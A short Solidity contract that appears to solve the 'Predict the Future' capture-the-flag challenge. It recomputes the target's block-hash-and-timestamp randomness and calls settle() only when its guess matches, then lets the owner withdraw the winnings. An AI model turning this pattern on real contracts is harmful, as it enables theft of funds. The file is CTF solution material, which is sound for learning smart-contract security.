pragma solidity ^0.4.21;

import "./PredictTheFuture.sol";

contract PredictTheFutureAnswer {
    address owner;
    PredictTheFutureChallenge challenge;
    function PredictTheFutureAnswer(PredictTheFutureChallenge _challenge) public {
        owner = msg.sender;
        challenge = PredictTheFutureChallenge(
            _challenge
        );
    }

    function lockInGuess(uint8 n) public payable {
        require(msg.value == 1 ether);
        challenge.lockInGuess.value(msg.value)(n);
    }

    function guess(uint8 n) public payable {
        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        if (answer == n) {
            challenge.settle();
        }
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
